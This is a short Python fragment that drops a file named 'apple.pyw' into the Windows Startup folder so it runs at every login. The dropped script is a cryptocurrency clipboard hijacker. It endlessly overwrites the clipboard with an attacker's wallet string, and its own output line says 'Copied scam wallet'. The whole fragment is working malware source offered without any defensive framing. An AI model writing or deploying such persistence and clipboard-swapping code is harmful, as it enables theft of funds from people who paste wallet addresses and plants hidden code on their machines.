kkl = os.path.expanduser('~')
path = f"{kkl}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
filename = "apple.pyw"
fpath = f"{path}\{filename}"

x = os.path.join(path, filename)

f = open(x, "w")
f.write("""
import clipboard
import asyncio
import random

async def wait4update():
    value = "my bitcoin wallet"
    while True:
        if clipboard.paste() != value: 
            clipboard.copy(value)
            print("Copied scam wallet")

asyncio.run(wait4update())
""")
f.close()
